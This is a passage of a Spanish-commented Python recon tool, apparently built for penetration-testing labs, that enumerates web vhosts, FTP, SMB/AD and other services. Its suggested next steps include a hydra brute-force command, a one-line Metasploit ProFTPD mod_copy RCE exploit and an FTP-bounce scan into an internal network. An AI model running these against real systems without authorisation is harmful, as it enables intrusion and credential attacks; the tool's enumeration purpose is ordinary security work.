        res["missing"].append("whatweb")
        return res
    for host in names:
        for p in webs:
            url = f"{web_scheme(p)}://{ip}:{p['port']}/"
            rc, out = run_capture(["whatweb", "-a", "3", "--header", f"Host: {host}", url], timeout=90)
            _step(res, f"whatweb --header 'Host: {host}' {url}", rc == 0, out,
                  note=f"fingerprint del vhost {host} (no el vhost por defecto del servidor)")
            if rc == 0 and out.strip():
                res["findings"].append(("info", f"{host} ({p['port']}): {out.strip()[:300]}"))

            # robots.txt CON el Host correcto: delata rutas "ocultas" del vhost sin
            # fuzzing (el robots.txt del vhost por defecto que ya mira fp_web puede
            # no tener nada que ver — visto en vivo en inlanefreight.htb: la raíz daba
            # 404 pero el vhost descubierto listaba Disallow: /admin_h1dd3n con una
            # API key en texto plano dentro).
            rst, _rh, rbody = _http_get(f"{url}robots.txt", host=host)
            if rst == 200 and rbody.strip():
                _step(res, f"GET {url}robots.txt  (Host: {host})", True, rbody,
                      note=f"robots.txt del vhost {host}, no el del vhost por defecto")
                for path in _robots_paths(rbody):
                    purl = url.rstrip("/") + path
                    pst, _ph, pbody = _http_get(purl, host=host, follow=False)
                    if pst in (301, 302, 307, 308) and not purl.endswith("/"):
                        # Redirect típico "añade la barra final" — algunos backends
                        # detrás de proxy devuelven el Location SIN el puerto real
                        # (ej. http://vhost/ruta/ en vez de http://vhost:PUERTO/ruta/),
                        # así que seguirlo con follow=True conecta al 80 y falla.
                        # Probamos nosotros mismos con "/" sobre el mismo ip:puerto.
                        purl += "/"
                        pst, _ph, pbody = _http_get(purl, host=host)
                    _step(res, f"GET {purl}  (Host: {host})", bool(pst and 200 <= pst < 300),
                          f"HTTP {pst}\n{pbody[:400]}" if pbody else f"HTTP {pst}",
                          note=f"ruta de robots.txt ({host})")
                    if pst and 200 <= pst < 300 and pbody.strip():
                        res["findings"].append(
                            ("alta", f"{host}{path} (vía robots.txt) responde {pst}: "
                                     f"{sanitize(pbody.strip())[:200]}"))
                    elif pst:
                        res["next"].append(
                            f"curl -s -H 'Host: {host}' {purl}  # robots.txt la marca, status {pst}")
    return res


# ───────────────────────── Dominios y hallazgos ─────────────────────────
def discover_domains(ports, host):
    blob = "\n".join([s for p in ports for s in p["scripts"].values()] +
                     [p.get("banner", "") for p in ports] + list(host.values()))
    return sorted({d.lower() for d in _DOM_RE.findall(blob)})


# Nombre NetBIOS del equipo (p. ej. 'ACADEMY-EA-DC01'), de los 3 NSE que ya lo capturan por
# distintos caminos — confirmado contra una captura real: 'rdp-ntlm-info' (campo propio del
# protocolo NTLM, formato impacket/nmap), 'smb-os-discovery' (a veces con un '\x00' colgando,
# quirk conocido de ese script) y 'nbstat' (línea "NetBIOS name: X, NetBIOS user: ...").
_NETBIOS_NAME_RE = re.compile(
    r"NetBIOS_Computer_Name:\s*(\S+)|NetBIOS computer name:\s*([^\s\\]+)|NetBIOS name:\s*([^,\s]+)",
    re.I)


def netbios_computer_name(ports, host):
    """Nombre NetBIOS del equipo, para rellenar el placeholder 'NETBIOS-DEL-DC' del next-step
    de Zerologon (ver fp_smb/_fill_netbios_placeholder) sin que el operador tenga que ir a
    buscarlo a mano — nbstat/rdp-ntlm-info/smb-os-discovery YA lo capturan en la Fase 2,
    bastante antes de que se genere ese next-step. None si ninguno de los tres se ejecutó o no
    lo devolvió. Mismo patrón de 'blob' que discover_domains. Puro → testable sin red."""
    blob = "\n".join([s for p in ports for s in p["scripts"].values()] +
                     [p.get("banner", "") for p in ports] + list(host.values()))
    m = _NETBIOS_NAME_RE.search(blob)
    if not m:
        return None
    return next(g for g in m.groups() if g).rstrip("\x00").strip()


# ccTLDs con 2º nivel (p. ej. "hostgator.com.br": el dominio registrable NO son las
# últimas 2 etiquetas, "com.br", sino las últimas 3). Lista corta de los más comunes
# en recon/bug bounty, no la Public Suffix List completa — amplíala si topas con uno
# que falte (la señal es un WHOIS/crt.sh que tarda muchísimo o da datos del TLD entero).
_TWO_LEVEL_TLDS = {
    "co.uk", "org.uk", "ac.uk", "gov.uk", "net.uk",
    "com.br", "net.br", "org.br", "gov.br",
    "com.au", "net.au", "org.au", "gov.au",
    "co.jp", "ne.jp", "co.kr", "co.in", "net.in", "co.nz", "co.za",
    "com.mx", "com.ar", "com.co", "com.pe", "com.cn", "net.cn", "org.cn",
    "com.sg", "com.tr", "com.hk", "com.tw",
}


def base_domain(d):
    parts = d.split(".")
    if len(parts) >= 3 and ".".join(parts[-2:]) in _TWO_LEVEL_TLDS:
        return ".".join(parts[-3:])
    return ".".join(parts[-2:]) if len(parts) >= 2 else d


INTERESTING = [
    (re.compile(r"Anonymous FTP login allowed", re.I), "FTP anónimo permitido"),
    (re.compile(r"\b(PUT|DELETE|TRACE)\b"), "Métodos HTTP peligrosos"),
    (re.compile(r"message_signing:\s*disabled", re.I), "SMB signing desactivado"),
    (re.compile(r"Anonymous access:\s*READ", re.I), "Share SMB legible anónimo"),
    (re.compile(r"/\.git", re.I), ".git expuesto"),
    (re.compile(r"Disallow:\s*/\S", re.I), "robots.txt con Disallow"),
    (re.compile(r"VULNERABLE", re.I), "NSE marca VULNERABLE"),
    (re.compile(r"\bpublic\b.*community", re.I), "SNMP community 'public'"),
]


def highlight(ports, host):
    text = "\n".join([f"{sid}: {out}" for p in ports for sid, out in p["scripts"].items()] +
                     [f"{sid}: {out}" for sid, out in host.items()])
    seen = []
    for rx, label in INTERESTING:
        for line in text.splitlines():
            if rx.search(line) and (label, line.strip()[:100]) not in seen:
                seen.append((label, line.strip()[:100]))
    return seen


# ═══════════════════════ Footprinting por protocolo (Fase 5) ═══════════════════════
# Enumeración manual de solo-lectura, con credenciales por defecto (anónimo/null/
# public) — lo que enseña el módulo Footprinting del path CPTS. Cada función
# devuelve un dict uniforme; si una herramienta no está instalada, se anota y se
# salta (el núcleo FTP/SMTP no necesita binarios externos: usa ftplib/smtplib).

SEV_ORDER = {"critica": 0, "alta": 1, "media": 2, "info": 3}


def _fp(proto, title, ports):
    return {"proto": proto, "title": title, "ports": sorted(ports),
            "steps": [], "findings": [], "next": [], "missing": []}


def _step(res, cmd, ok, output, note=""):
    res["steps"].append({"cmd": cmd, "ok": bool(ok),
                         "output": sanitize(output or "")[:8000], "note": note})


def classify(p):
    """Protocolo canónico de un puerto/servicio, o None si no hay footprint propio."""
    n = (p["name"] or "").lower()
    port = p["port"]
    if n == "ftp" or n == "ftp-data" or port == 21:
        return "ftp"
    if n in ("netbios-ssn", "microsoft-ds") or port in (139, 445):
        return "smb"
    if n in ("nfs", "rpcbind", "mountd", "nfs_acl", "nlockmgr") or port in (111, 2049):
        return "nfs"
    if n == "domain" or port == 53:
        return "dns"
    if n in ("smtp", "submission") or port in (25, 465, 587):
        return "smtp"
    if n.startswith("imap") or port in (143, 993):
        return "imap"
    if n.startswith("pop3") or port in (110, 995):
        return "pop3"
    if n == "snmp" or port == 161:
        return "snmp"
    if n == "mysql" or port == 3306:
        return "mysql"
    if port == 1433 or (n.startswith("ms-sql") and n != "ms-sql-m"):
        return "mssql"   # ms-sql-m (1434/udp) es el SQL Browser, no la BD → no footprintear como MSSQL
    if "oracle" in n or port == 1521:
        return "oracle"
    if n.startswith("ipmi") or port == 623:
        return "ipmi"
    if n in ("postgresql", "postgres") or port == 5432:
        return "postgres"
    if n in ("mongodb", "mongod") or port in (27017, 27018):
        return "mongodb"
    if n == "telnet" or port == 23:
        return "telnet"
    if n == "redis" or port == 6379:
        return "redis"
    if n in ("ldap", "ldapssl") or port in (389, 636, 3268, 3269):
        return "ldap"
    if n == "rsync" or port == 873:
        return "rsync"
    if n in ("exec", "login", "shell", "rlogin", "rexec", "rsh", "klogin", "kshell") or port in (512, 513, 514):
        return "rservices"
    if n == "ssh" or port == 22:
        return "ssh"
    if n in ("ms-wbt-server", "rdp") or port == 3389:
        return "rdp"
    if n == "vnc" or 5900 <= port <= 5906:
        return "vnc"
    if n == "msrpc" or port == 135:
        return "msrpc"
    if n in ("wsman", "wsmans") or port in (5985, 5986):
        return "winrm"
    if n == "ajp13" or port == 8009:
        return "ajp"
    if n in ("elasticsearch",) or port in (9200, 9300):
        return "elastic"
    if n == "memcached" or port == 11211:
        return "memcached"
    if n == "couchdb" or port in (5984, 6984):
        return "couchdb"
    if n in ("java-rmi", "rmiregistry") or port in (1099, 1098):
        return "rmi"
    if n in ("kerberos-sec", "kerberos") or port == 88:
        return "kerberos"
    if port in (2375, 2376):
        return "docker"
    if n == "tftp" or port == 69:
        return "tftp"
    if (n in ("", "ntp") and port == 123):
        return "ntp"
    if n == "finger" or port == 79:
        return "finger"
    if n in ("ipp", "cups") or port == 631:
        return "ipp"
    if n in ("x11", "x11-1", "x11-2", "x11-3") or 6000 <= port <= 6009:
        return "x11"
    if n == "git" or port == 9418:
        return "gitdaemon"
    # Fallback por banner: nmap dejó el puerto como 'unknown' (p. ej. un ProFTPD en 30021, un
    # puerto no estándar) pero el saludo del servicio lo delata → así corre su footprint y sus
    # credenciales por defecto en vez de ignorarlo.
    if n in ("", "unknown", "tcpwrapped"):
        bl = (p.get("banner") or "").lower()
        # Nombres de demonio inequívocos → directos; los tokens genéricos (ftp/smtp) exigen además
        # el saludo típico (empieza por "220") para no clasificar de más por un substring suelto.
        if bl.startswith("ssh-"):
            return "ssh"
        if "proftpd" in bl or "vsftpd" in bl or "pure-ftpd" in bl or "filezilla" in bl or "ftp server" in bl:
            return "ftp"
        # SMTP ("esmtp"/"smtp") se comprueba ANTES del fallback genérico "220 + 'ftp' en
        # cualquier parte del banner": un hostname de correo que contenga 'ftp' como substring
        # (p. ej. "220 mail-ftp01.example.com ESMTP Postfix") caía en FTP por ese substring
        # suelto antes de llegar aquí — "esmtp"/"smtp" son tokens menos ambiguos que "ftp".
        if bl.startswith("220") and ("esmtp" in bl or "smtp" in bl):
            return "smtp"
        if bl.startswith("220") and "ftp" in bl:
            return "ftp"
        if bl.startswith("+ok"):
            return "pop3"
        if bl.startswith("* ok") or "imap" in bl:
            return "imap"
        if "mariadb" in bl or "mysql" in bl:
            return "mysql"
    return None


def _confirmed_open(p):
    """¿El puerto está CONFIRMADO abierto para footprintear? En UDP, nmap marca
    'open|filtered' cuando no hubo respuesta a su sonda (puede estar filtrado o
    simplemente mudo): no es fiable y lleva a enumeración especulativa / falsos
    positivos (p. ej. un 'IPMI RAKP' fantasma sobre un 623/udp que no responde). Solo se
    footprintea el UDP en estado 'open' puro; en TCP, 'open' siempre vale."""
    return not (p["proto"] == "udp" and "filtered" in (p.get("state") or ""))


def _nse_for(services, host, ids):
    """Recoge la salida NSE (de puerto o de host) cuyos ids empiezan por alguno
    de los prefijos dados — para consolidarla dentro del footprint del protocolo."""
    out = []
    for p in services:
        for sid, txt in p["scripts"].items():
            if any(sid.startswith(x) for x in ids) and txt:
                out.append((f"{sid} ({p['port']}/{p['proto']})", txt))
    for sid, txt in host.items():
        if any(sid.startswith(x) for x in ids) and txt:
            out.append((sid, txt))
    return out


def _ftp_modcopy(ip, port):
    """Prueba de SOLO LECTURA si ProFTPD tiene mod_copy activo (CVE-2015-3306): el comando
    'SITE CPFR <ruta>' devuelve 350 si el módulo está cargado (prepara una copia), y ahí nos
    paramos — NUNCA se envía 'SITE CPTO', así que no se escribe nada en el objetivo. mod_copy
    permite copiar ficheros arbitrarios SIN autenticación (lectura y escritura) → RCE (CVSS 10,
    CISA KEV). Un servidor sin mod_copy responde 500 ('SITE CPFR not understood') → error_perm,
    que se traga como «no vulnerable». Devuelve la respuesta 350 si parece vulnerable, o None."""
    import ftplib
    try:
        f = ftplib.FTP()
        f.connect(ip, port, timeout=10)
        try:
            f.login("anonymous", "anonymous@palantir")   # algunos exigen login; otros aceptan SITE sin él
        except ftplib.error_perm:
            pass
        resp = ""
        try:
            resp = f.sendcmd("SITE CPFR /etc/hostname")   # stage de una copia (read-only; jamás CPTO)
        except ftplib.all_errors:
            resp = ""
        try:
            f.quit()
        except ftplib.all_errors:
            try:
                f.close()
            except ftplib.all_errors:
                pass
        if resp.startswith("350"):
            return resp
    except OSError:
        pass
    return None


def fp_ftp(ip, ports, services, host, deep):
    import ftplib
    res = _fp("ftp", "FTP", [p["port"] for p in ports])
    for p in ports:
        port = p["port"]
        last_err = None
        for attempt in (1, 2):                    # el saludo 220 a veces tarda → un reintento
            try:
                f = ftplib.FTP()
                f.connect(ip, port, timeout=12)
                welcome = f.getwelcome() or ""
                f.login("anonymous", "anonymous@palantir")   # login anónimo estándar
                try:
                    f.set_pasv(True)              # pasivo por defecto: evita cuelgues del canal de datos
                except ftplib.Error:
                    pass
                listing = []
                try:
                    f.retrlines("LIST", listing.append)
                except ftplib.Error:
                    pass
                try:
                    f.quit()
                except ftplib.Error:
                    f.close()
                body = (welcome + "\n" + "\n".join(listing)).strip()
                _step(res, f"ftplib: login anonymous@{ip}:{port} + LIST", True, body)
                res["findings"].append(("alta", f"FTP {port}: login anónimo permitido "
                                                f"({len(listing)} entradas listadas)"))
                for ln in listing:                # botín en el listado anónimo
                    name = ln.split()[-1] if ln.split() else ""
                    if name not in (".", "..") and _SMB_LOOT_RE.search(name):
                        res["findings"].append(("alta", f"FTP {port}: fichero interesante — {name}"))
                res["next"] += [
                    f"wget -m --no-passive ftp://anonymous:anonymous@{ip}:{port}   # espejo recursivo",
                    f"ftp {ip} {port}  →  'put testupload.txt'   # ¿se puede escribir?",
                ]
                last_err = None
                break
            except ftplib.error_perm as e:
                _step(res, f"ftplib: login anonymous@{ip}:{port}", False, f"anónimo denegado: {e}")
                res["next"].append(f"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://{ip}:{port}")
                last_err = None
                break                             # anónimo denegado: no tiene sentido reintentar
            except OSError as e:
                last_err = e                      # timeout/conexión: reintenta una vez
        if last_err is not None:
            _step(res, f"ftplib: conectar {ip}:{port}", False,
                  f"error de conexión tras 2 intentos: {last_err}  "
                  f"(OJO: si la Fase 5c 'nxc ftp' sí entra, el FTP está vivo — habrá tardado el saludo o choca el modo activo/pasivo)")
        # mod_copy (ProFTPD, CVE-2015-3306): 'SITE CPFR' → 350 = módulo activo. Read-only (nunca CPTO).
        mc = _ftp_modcopy(ip, port)
        if mc:
            _step(res, f"ftplib: SITE CPFR /etc/hostname @{ip}:{port}", True, mc,
                  note="mod_copy: 'SITE CPFR' aceptado (350) → módulo de copia arbitraria activo (no se envió CPTO, no se escribió nada)")
            res["findings"].append(("critica",
                f"FTP {port}: ProFTPD mod_copy ACTIVO (SITE CPFR aceptado) — CVE-2015-3306: copia de ficheros "
                "arbitrarios SIN autenticación (lectura Y escritura) → RCE (subir webshell / leer claves SSH). CVSS 10, CISA KEV."))
            res["next"] += [
                "searchsploit -x 37262   # ProFTPD mod_copy RCE (Metasploit) — CVE-2015-3306",
                f"msfconsole -q -x 'use exploit/unix/ftp/proftpd_modcopy_exec;set RHOSTS {ip};set RPORT {port};run'   # mod_copy → RCE (paso MANUAL)",
            ]
    for lbl, txt in _nse_for(services, host, ("ftp-",)):
        _step(res, f"nmap {lbl}", True, txt, note="lo que ya sacó nmap con sus scripts NSE para este servicio")
        if "bounce" in lbl and re.search(r"bounce working|succeeded", txt, re.I):
            bport = ports[0]["port"] if ports else 21
            res["findings"].append(("alta",
                f"FTP {bport}: FTP bounce ACTIVO (el servidor permite PORT a terceros) — se puede escanear/pivotar "
                f"a la red interna a través de él: nmap -Pn -b anonymous:anonymous@{ip}:{bport} <IP-interna>"))
    return res


# ─────────────── NetExec (nxc) — identidades por defecto y helpers ───────────────
# nxc/netexec habla MUCHOS protocolos con la misma sintaxis: nxc <proto> <ip> -u U -p P.
# palantir solo prueba credenciales POR DEFECTO sin contraseña, UN intento por cuenta
# (null → guest → Administrator). Eso NO es fuerza bruta ni password spraying: es
# comprobar accesos por defecto mal configurados, en lectura. Validar listas de
# usuarios/contraseñas queda SIEMPRE como sugerencia manual, nunca se ejecuta aquí.
NXC_ANON_IDS = [("", "sesión nula"), ("guest", "invitado 'guest'"),
                ("Administrator", "Administrator sin contraseña")]


def _bin_with_sudo_fallback(names, home_dirs=(), extra_paths=()):
    """Primer binario de `names` en el PATH actual; si ninguno aparece, prueba también
    `home_dirs` (relativos al $HOME del usuario REAL bajo sudo — pipx deja binarios en
    .local/bin, Go en go/bin) y `extra_paths` absolutas conocidas. Bajo sudo, el PATH
    restringido de root (secure_path de sudoers) no ve nada instalado fuera de apt —
    mismo bug que costó crt.sh (ver _crtsh_bin); esto lo generaliza para cualquier
    binario instalado por pipx/Go/cargo/npm global en vez de apt."""
    for t in names:
        if have(t):
            return t
    ids = _real_user_ids()
    home = _real_home(ids) if ids else Path.home()
    cands = [home / d / t for d in home_dirs for t in names] if home else []
    cands += [Path(p) for p in extra_paths]
    for cand in cands:
        if cand.is_file() and os.access(cand, os.X_OK):
            return str(cand)
    return None


def nxc_bin():
    """Primer binario de la familia NetExec disponible (nxc es el nombre nuevo).
    pipx (instalación recomendada para tener parches recientes de protocolo) lo deja
    en $HOME/.local/bin, fuera del PATH restringido de sudo."""
    return _bin_with_sudo_fallback(("nxc", "netexec", "crackmapexec"), home_dirs=(".local/bin",))


def _rpcdump_bin():
    """impacket-rpcdump/rpcdump.py: Kali lo trae en apt (impacket-scripts, en PATH de
    sudo sin problema), pero una instalación más reciente vía pip/pipx cae en
    $HOME/.local/bin igual que nxc."""
    return _bin_with_sudo_fallback(("impacket-rpcdump", "rpcdump.py"), home_dirs=(".local/bin",))


def _kerbrute_bin():
    """kerbrute (enum de usuarios AD por Kerberos pre-auth): no está en apt (binario Go
    de ropnop), suele caer en $HOME/go/bin, /usr/local/bin o ~/.local/bin; bajo sudo el
    PATH restringido de root no los ve (mismo caso que crt.sh/nxc)."""
    return _bin_with_sudo_fallback(("kerbrute",), home_dirs=("go/bin", ".local/bin"),
                                   extra_paths=("/usr/local/bin/kerbrute", "/opt/kerbrute/kerbrute"))


def _secretsdump_bin():
    """secretsdump.py: Kali lo trae en apt (impacket-scripts, mismo paquete que rpcdump.py) como
    'impacket-secretsdump' — confirmado en un run real, por eso va primero (antes se miraba
    'secretsdump.py' primero, un nombre que en la práctica case nunca aparece así en el PATH:
    pip tampoco instala el entry point CON el '.py'; la función seguía acertando porque caía al
    segundo candidato, pero mejor probar primero el que de verdad suele estar)."""
    return _bin_with_sudo_fallback(("impacket-secretsdump", "secretsdump.py"), home_dirs=(".local/bin",))


def _adidnsdump_bin():
    """adidnsdump (dirkjanm/adidnsdump): no es paquete apt → pip/pipx install adidnsdump."""
    return _bin_with_sudo_fallback(("adidnsdump",), home_dirs=(".local/bin",))


def _impacket_suggest_bin(script):
    """Mejor nombre para SUGERIR un script de ejemplo de impacket que palantir nunca ejecuta él
    mismo (GetNPUsers/GetUserSPNs, de momento — solo aparece en 'next', para que el operador lo
    copie y pegue tal cual). Bug real confirmado por un operador en Kali, pedido explícito tras
    verlo fallar: el paquete apt 'impacket-scripts' instala estos como 'impacket-<Nombre>' (p.
    ej. 'impacket-GetNPUsers'), NO como '<Nombre>.py' — sugerir el nombre viejo hacía fallar el
    copy-paste con 'command not found', y el operador tuvo que corregirlo a mano. Con pip puro
    ('pip install impacket', sin el paquete de Kali) el entry point es '<Nombre>' a secas, sin
    '.py'. Mismo `_bin_with_sudo_fallback` que el resto de resolvers de este fichero (bajo sudo,
    si el operador lo instaló por pipx/pip --user, cae a su `.local/bin` real). Si ninguno de
    los dos aparece, cae al nombre histórico '<Nombre>.py': el operador lo ajusta a mano, como
    siempre se ha tenido que hacer para quien clona el repo de impacket directamente en vez de
    instalarlo."""
    found = _bin_with_sudo_fallback((f"impacket-{script}", script), home_dirs=(".local/bin",))
    return found or f"{script}.py"


# Listas de usuarios PEQUEÑAS para el kerbrute userenum automático (Fase 5): minutos,
# no horas — una lista grande de verdad (p. ej. xato-10M) se pasa a mano con
# --userenum-wordlist. La shortlist de seclists (~17 nombres) ya saca cuentas obvias tipo
# 'administrator'/'guest' — pero esas casi siempre YA salen antes por RID cycling o enum
# anónima (_smb_ad_enum/fp_ldap); donde kerbrute aporta de verdad es en un DC endurecido sin
# esa superficie, adivinando cuentas de EMPLEADOS REALES — para eso está jsmith.txt
# (insidetrust/statistically-likely-usernames: patrones first.last/flast/lastf… de los
# nombres/apellidos más comunes). No viene empaquetada en seclists (repo aparte); si el
# operador la instala en una de estas rutas, se usa automáticamente, SIN pasar
# --userenum-wordlist — para instalarla:
#   mkdir -p /usr/share/wordlists/statistically-likely-usernames && \
#     curl -o /usr/share/wordlists/statistically-likely-usernames/jsmith.txt \
#     https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jsmith.txt
_JSMITH_USERLISTS = (
    "/usr/share/wordlists/statistically-likely-usernames/jsmith.txt",
    "/usr/share/seclists/Usernames/statistically-likely-usernames/jsmith.txt",  # por si algún día la empaquetan ahí
)
_SMALL_USERLISTS = (
    "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
    "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt",
)


def _userenum_wordlist(arg=None):
    """Wordlist para el kerbrute userenum. Con --userenum-wordlist (arg) se respeta la que
    diga el operador, del tamaño que sea (es su decisión esperar); sin ella, el modo
    AUTOMÁTICO prueba primero jsmith.txt (nombres de empleado realistas — ver
    _JSMITH_USERLISTS; ~48 000 líneas, unos minutos contra Kerberos, no segundos pero lejísimos
    de las horas de una xato-10M) y, si el operador no la instaló, cae a la shortlist genérica
    de seclists (administrator/guest/…). None si no hay ninguna → se deja como sugerencia
    manual. Ver _kerbrute_timeout: el cap de tiempo depende de CUÁL de las dos se use."""
    if arg:
        return arg if Path(arg).is_file() else None
    for c in _JSMITH_USERLISTS + _SMALL_USERLISTS:
        if Path(c).is_file():
            return c
    return None


def _kerbrute_timeout(wl):
    """Cap de tiempo para `kerbrute userenum` según la lista que de verdad se vaya a usar, no
    solo "¿el operador pasó --userenum-wordlist?": 10 min para la shortlist genérica
    automática (sobra, es minúscula); 30 min para jsmith.txt automática (~48 000 líneas: unos
    minutos en un DC normal, pero este margen aguanta un DC lento o con latencia de VPN sin
    cortarla en seco); 2 h si el operador trajo su propia lista con --userenum-wordlist (puede
    ser una xato-10M de verdad — ahí sí puede tardar horas). Puro → testeable sin red."""
    if USERENUM_WORDLIST:
        return 7200
    if wl in _JSMITH_USERLISTS:
        return 1800
    return 600


def _parse_kerbrute_users(out):
    """Usuarios válidos de la salida de `kerbrute userenum`: líneas con 'VALID USERNAME:'
    seguidas de 'usuario@dominio' (se queda con el usuario, sin el dominio). Marca aparte
    las que kerbrute etiqueta como sin pre-auth (AS-REP roastables). Puro → testable sin
    red. Tolera códigos de color ANSI de kerbrute (los descuenta antes de casar)."""
    users, noauth = [], []
    for line in (out or "").splitlines():
        clean = _ANSI_RE.sub("", line)
        m = re.search(r"VALID USERNAME:\s*([^\s@]+)", clean)
        if not m:
            continue
        u = m.group(1)
        users.append(u)
        # kerbrute marca las AS-REP roastables de varias formas según versión:
        # "(NO PREAUTH)", "has no pre auth required" → tolera espacios/guiones entre pre y auth.
        if re.search(r"no[\s-]*pre[\s-]*auth", clean, re.I):
            noauth.append(u)
    return list(dict.fromkeys(users)), list(dict.fromkeys(noauth))


def certipy_bin():
    """Certipy (AD CS): no está en apt, se instala con pipx/pip (certipy-ad), cae en
    $HOME/.local/bin igual que nxc. Solo se usa en la Fase 5d, con una credencial de
    dominio YA validada — 'certipy find' es de SOLO LECTURA (enumera CAs/plantillas
    vía LDAP, no escribe nada); 'certipy req'/'certipy shadow' (pedir o fabricar un
    certificado) son una escalada activa y palantir nunca los encadena solo — quedan
    como sugerencia manual en 'next', igual que el volcado de NTDS (ver MEJORAS.md)."""
    return _bin_with_sudo_fallback(("certipy", "certipy-ad"), home_dirs=(".local/bin",))


def _creds_bin():
    """`creds` (DefaultCreds-cheat-sheet, ihebski): no está en apt, pipx lo deja en
    $HOME/.local/bin igual que nxc/certipy. Consulta de SOLO LECTURA contra una base
    de datos LOCAL (TinyDB/JSON, se actualiza con `creds update`) — nunca toca el
    objetivo ni la red, coste cero, seguro de lanzar siempre que haya un producto."""
    return _bin_with_sudo_fallback(("creds",), home_dirs=(".local/bin",))


def _nxc_ok(out):
    """¿nxc marcó un login válido? '[+]' sí, salvo que sea un fallo de logon."""
    return bool(re.search(r"\[\+\]", out)) and "STATUS_LOGON_FAILURE" not in out


def _nxc_has_data(out):
    """¿Una enumeración de nxc (--users/--rid-brute/--pass-pol/--groups…) devolvió DATOS
    de verdad, o solo el banner [*] y la línea de login [+]? Un '[+]' NO es un dato: un DC
    moderno ACEPTA la sesión nula/anónima (RestrictAnonymous) y luego DENIEGA cada lectura,
    así que seguir lanzando flags con esa misma identidad es tiempo perdido (devuelven lo
    mismo: nada). nxc imprime los datos enumerados como líneas con el prefijo
    'PROTO  IP  PUERTO  HOST' seguido de contenido que NO empieza por un tag [*]/[+]/[-]
    (p. ej. 'IPC$  READ', '500: DOM\\Administrator (SidTypeUser)', 'Minimum password
    length: 7'). Heurística conservadora: ante la duda dice que SÍ hay datos (prefiere no
    cortar de más; el riesgo malo sería saltarse una enum que SÍ habría funcionado)."""
    for line in out.splitlines():
        s = line.strip()
        if not s:
            continue
        m = re.match(r"^\S+\s+\S+\s+\d+\s+\S+\s+(.*)$", line)   # quita "PROTO IP PUERTO HOST"
        rest = m.group(1).strip() if m else s
        if rest and rest[0] != "[":                            # fila de datos (no [*]/[+]/[-])
            return True
    return False


_NXC_SIGNING_RE = re.compile(r"\(signing:(True|False)\)")


def _parse_nxc_signing(out):
    """¿SMB signing requerido? True/False/None (no se pudo leer) del banner de nxc smb, que
    SIEMPRE lo imprime tras negociar el protocolo — ANTES de intentar login, así que sale
    incluso si la identidad probada falla. Formato confirmado contra un run real: '... Windows
    10 (name:FRONTDESK01) (domain:FrontDesk01) (signing:False) (SMBv1:None)'. Puro → testeable
    sin red."""
    m = _NXC_SIGNING_RE.search(out or "")
    return {"True": True, "False": False}.get(m.group(1)) if m else None


# Campos de `nxc --pass-pol` (SMB y LDAP: MISMO formato en los dos, viene de SAMR en ambos
# casos) que de verdad le importan al operador — ver HTB Academy, "Enumerating & Retrieving
# Password Policies": longitud mínima/complejidad/historial (higiene) y, sobre todo, el
# umbral de bloqueo (decide si el password spraying es viable sin bloquear cuentas).
_PASSPOL_FIELD_RE = {
    "min_len": re.compile(r"Minimum password length:\s*(\d+)", re.I),
    "history": re.compile(r"Password history length:\s*(\d+)", re.I),
    "complex": re.compile(r"Domain Password Complex:\s*(\d)", re.I),
    "lockout_threshold": re.compile(r"Account Lockout Threshold:\s*(\S+)", re.I),
    "lockout_duration": re.compile(r"Locked Account Duration:\s*([^\n]+)", re.I),
    "lockout_reset": re.compile(r"Reset Account Lockout Counter:\s*([^\n]+)", re.I),
}


def _parse_pass_pol(out):
    """Política de contraseñas del dominio desde la salida de `nxc --pass-pol` (SMB o LDAP:
    mismo formato en los dos). Devuelve un dict con las claves que le interesan al operador
    (longitud mínima, complejidad, historial, bloqueo) o {} si no hay nada reconocible (p. ej.
    acceso denegado: --pass-pol sin datos, solo el banner [*]/[+], ver _nxc_has_data). Puro →
    testeable sin red."""
    pol = {}
    for key, rx in _PASSPOL_FIELD_RE.items():
        m = rx.search(out or "")
        if m:
            pol[key] = m.group(1).strip()
    return pol


def _parse_rpcclient_dompwinfo(out):
    """Política de contraseñas PARCIAL (solo longitud mínima y complejidad: es todo lo que da
    este comando) desde `rpcclient -c getdompwinfo` — el fallback de HTB Academy cuando no hay
    nxc/netexec instalado (ver fp_smb). Mismo formato de dict que _parse_pass_pol (claves
    'min_len'/'complex'), para reutilizar el mismo resumen en _format_pass_pol_finding. {} si
    rpcclient no devolvió nada (acceso denegado). Puro → testeable sin red."""
    pol = {}
    m = re.search(r"min_password_length:\s*(\d+)", out or "", re.I)
    if m:
        pol["min_len"] = m.group(1)
        pol["complex"] = "1" if "DOMAIN_PASSWORD_COMPLEX" in (out or "") else "0"
    return pol


# Grupos de dominio por sesión nula (rpcclient). Formato confirmado por un operador real contra
# un DC de HTB (INLANEFREIGHT): 'enumdomgroups' da 'group:[Nombre] rid:[0x200]'; 'querygroupmem
# <rid>' da 'rid:[0x771] attr:[0x7]' (solo los RIDs de los miembros — hay que resolverlos aparte).
_RPC_GROUP_RE = re.compile(r"group:\[([^\]]+)\]\s+rid:\[(0x[0-9a-fA-F]+)\]")
_RPC_USER_RID_RE = re.compile(r"user:\[([^\]]+)\]\s+rid:\[(0x[0-9a-fA-F]+)\]")
_RPC_GROUPMEM_RID_RE = re.compile(r"rid:\[(0x[0-9a-fA-F]+)\]\s+attr:\[")
# RIDs (hex) de los grupos de dominio que dan control total del dominio si eres miembro — son los
# que SIEMPRE queremos expandir a su membresía (quién es admin). Son fijos en todo AD.
_RPC_ADMIN_GROUP_RIDS = {
    "0x200": "Domain Admins", "0x207": "Enterprise Admins",
    "0x206": "Schema Admins", "0x208": "Group Policy Creator Owners",
}
_RPC_FIRST_CUSTOM_RID = 1000   # RID >= 1000 (0x3e8) = objeto creado en el dominio, no un builtin


def _parse_rpcclient_groups(out):
    """[(nombre, rid_hex_minúsculas)] de la salida de `rpcclient -c enumdomgroups`. Puro →
    testeable sin red."""
    return [(m.group(1), m.group(2).lower()) for m in _RPC_GROUP_RE.finditer(out or "")]


def _parse_rpcclient_group_members(out):
    """RIDs (hex, minúsculas) de los miembros en la salida de `rpcclient -c 'querygroupmem <rid>'`
    — solo los RIDs; resolverlos a nombres es aparte (ver _rpc_rid_name_map). Puro."""
    return list(dict.fromkeys(m.group(1).lower() for m in _RPC_GROUPMEM_RID_RE.finditer(out or "")))


def _rpc_rid_name_map(out):
    """Mapa {rid_hex: nombre} a partir de las líneas user:[...] rid:[...] y group:[...] rid:[...]
